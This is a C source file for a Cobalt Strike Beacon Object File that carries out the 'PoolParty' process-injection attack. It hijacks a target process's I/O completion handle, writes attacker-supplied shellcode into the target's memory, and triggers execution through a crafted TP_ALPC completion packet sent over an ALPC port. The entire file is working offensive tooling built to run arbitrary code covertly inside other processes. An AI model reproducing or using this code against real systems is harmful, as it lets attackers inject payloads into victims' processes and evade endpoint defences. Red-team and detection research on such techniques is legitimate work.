#include <windows.h>
#include "PoolPartyBof.h"

HANDLE m_p_hIoCompletion = NULL;

HANDLE HijackIoCompletionProcessHandle(HANDLE p_hTarget) {
    return HijackProcessHandle((PWSTR)L"IoCompletion\0", p_hTarget, IO_COMPLETION_ALL_ACCESS);
}

HANDLE GetTargetThreadPoolIoCompletionHandle() {
    HANDLE p_hIoCompletion = HijackIoCompletionProcessHandle(m_p_hTargetPid);
    BeaconPrintf(CALLBACK_OUTPUT, "[INFO]   Hijacked I/O completion handle from the target process: %x", p_hIoCompletion);
    return p_hIoCompletion;
}


#define POOL_PARTY_ALPC_PORT_NAME_PREFIX L"\\RPC Control\\"
#define PORT_NAME_LENGTH 16
#define INIT_UNICODE_STRING(str) { sizeof(str) - sizeof((str)[0]), sizeof(str) - sizeof((str)[0]), (PWSTR)(str) }
#define POOL_PARTY_POEM "Dive right in and make a splash,\n" \
                        "We're throwing a pool party in a flash!\n" \
                        "Bring your swimsuits and sunscreen galore,\n" \
                        "We'll turn up the heat and let the good times pour!\n"

wchar_t generateRandomLetter() {
    return L'A' + MSVCRT$rand() % 26;
}

wchar_t* generateRandomLetters(int length) {
    wchar_t* randomLetters = (wchar_t*)MSVCRT$malloc((length + 1) * sizeof(wchar_t));
    for (int i = 0; i < length; ++i) {
        randomLetters[i] = generateRandomLetter();
    }
    randomLetters[length] = L'\0';
    return randomLetters;
}

void RemoteTpAlpcInsertionSetupExecution() {
	MSVCRT$srand((unsigned int)MSVCRT$time(NULL));
	wchar_t* randomLetters = generateRandomLetters(PORT_NAME_LENGTH);
	size_t prefixLength = MSVCRT$wcslen(POOL_PARTY_ALPC_PORT_NAME_PREFIX);
	size_t totalLength = prefixLength + PORT_NAME_LENGTH + 1;
	wchar_t* portName = (wchar_t*)MSVCRT$malloc((MSVCRT$wcslen(POOL_PARTY_ALPC_PORT_NAME_PREFIX) + PORT_NAME_LENGTH + 1) * sizeof(wchar_t));
	MSVCRT$wcscpy_s(portName, totalLength, POOL_PARTY_ALPC_PORT_NAME_PREFIX);
	MSVCRT$wcscat_s(portName, totalLength, randomLetters);
	wchar_t* POOL_PARTY_ALPC_PORT_NAME = portName;

	_NtAlpcCreatePort NtAlpcCreatePort = (_NtAlpcCreatePort)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAlpcCreatePort"));
	_TpAllocAlpcCompletion TpAllocAlpcCompletion = (_TpAllocAlpcCompletion)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpAllocAlpcCompletion"));
	_NtAlpcSetInformation NtAlpcSetInformation = (_NtAlpcSetInformation)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAlpcSetInformation"));
	_NtAlpcConnectPort NtAlpcConnectPort = (_NtAlpcConnectPort)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAlpcConnectPort"));

	HANDLE hTempAlpcConnectionPort;
	NTSTATUS Ntstatus = NtAlpcCreatePort(&hTempAlpcConnectionPort, NULL, NULL);
	if (!NT_SUCCESS(Ntstatus)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Failed to create a temporary ALPC port.");
			return;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Created a temporary ALPC port: %d", hTempAlpcConnectionPort);

	PFULL_TP_ALPC pTpAlpc = { 0 };
	Ntstatus = TpAllocAlpcCompletion(&pTpAlpc, hTempAlpcConnectionPort, (PTP_ALPC_CALLBACK)(m_ShellcodeAddress), NULL, NULL);
	if (!NT_SUCCESS(Ntstatus)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Failed to create TP_ALPC structure associated with the shellcode.");
		return;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Created TP_ALPC structure associated with the shellcode");

	UNICODE_STRING usAlpcPortName = INIT_UNICODE_STRING(POOL_PARTY_ALPC_PORT_NAME);

	OBJECT_ATTRIBUTES AlpcObjectAttributes = { 0 };
	AlpcObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	AlpcObjectAttributes.ObjectName = &usAlpcPortName;

	ALPC_PORT_ATTRIBUTES AlpcPortAttributes = { 0 };
	AlpcPortAttributes.Flags = 0x20000;
	AlpcPortAttributes.MaxMessageLength = 328;

	HANDLE hAlpcConnectionPort;
	Ntstatus = NtAlpcCreatePort(&hAlpcConnectionPort, &AlpcObjectAttributes, &AlpcPortAttributes);
	if (!NT_SUCCESS(Ntstatus)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Failed to create pool party ALPC port `%s`: %d.", POOL_PARTY_ALPC_PORT_NAME, hAlpcConnectionPort);
		return;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Created pool party ALPC port `%s`: %d", POOL_PARTY_ALPC_PORT_NAME, hAlpcConnectionPort);

	PFULL_TP_ALPC pRemoteTpAlpc = (PFULL_TP_ALPC)(KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Allocated TP_ALPC memory in the target process: %p", pRemoteTpAlpc);
	KERNEL32$WriteProcessMemory(m_p_hTargetPid, pRemoteTpAlpc, pTpAlpc, sizeof(FULL_TP_ALPC), NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Written the specially crafted TP_ALPC structure to the target process");

	ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCopmletionPort = { 0 };
	AlpcPortAssociateCopmletionPort.CompletionKey = pRemoteTpAlpc;
	AlpcPortAssociateCopmletionPort.CompletionPort = m_p_hIoCompletion;
	NtAlpcSetInformation(hAlpcConnectionPort, AlpcAssociateCompletionPortInformation, &AlpcPortAssociateCopmletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Associated ALPC port `%s` with the IO completion port of the target process worker factory", POOL_PARTY_ALPC_PORT_NAME);

	OBJECT_ATTRIBUTES AlpcClientObjectAttributes = { 0 };
	AlpcClientObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);

	const char* Buffer = POOL_PARTY_POEM;
	int BufferLength = sizeof(Buffer);

	ALPC_MESSAGE ClientAlpcPortMessage = { 0 };
	ClientAlpcPortMessage.PortHeader.u1.s1.DataLength = BufferLength;
	ClientAlpcPortMessage.PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + BufferLength;
	memcpy(ClientAlpcPortMessage.PortMessage, Buffer, sizeof(ClientAlpcPortMessage.PortMessage));
	size_t szClientAlpcPortMessage = sizeof(ClientAlpcPortMessage);

	/* NtAlpcConnectPort would block forever if not used with timeout, we set timeout to 1 second */
	LARGE_INTEGER liTimeout = { 0 };
	liTimeout.QuadPart = -10000000;
	HANDLE hAlpc_;
	NtAlpcConnectPort(
		&hAlpc_,
		&usAlpcPortName,
		&AlpcClientObjectAttributes,
		&AlpcPortAttributes,
		0x20000,
		NULL,
		(PPORT_MESSAGE)&ClientAlpcPortMessage,
		&szClientAlpcPortMessage,
		NULL,
		NULL,
		&liTimeout);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Connected to ALPC port `%s` to queue a packet to the IO completion port of the target process worker factory", POOL_PARTY_ALPC_PORT_NAME);
}

void HijackHandles() {
	m_p_hIoCompletion = GetTargetThreadPoolIoCompletionHandle();
}

void Inject() {
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Starting PoolParty attack against process id: %d", m_dwTargetPid);
	m_p_hTargetPid = GetTargetProcessHandle();
	HijackHandles();
	m_ShellcodeAddress = AllocateShellcodeMemory();
	WriteShellcode();
	RemoteTpAlpcInsertionSetupExecution();
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	PoolParty attack completed.");
}

void go(char * args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    m_dwTargetPid = BeaconDataInt(&parser);
    m_szShellcodeSize = BeaconDataLength(&parser);
    m_cShellcode = BeaconDataExtract(&parser, NULL);
	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Shellcode Size: %d bytes", m_szShellcodeSize);
	Inject();
}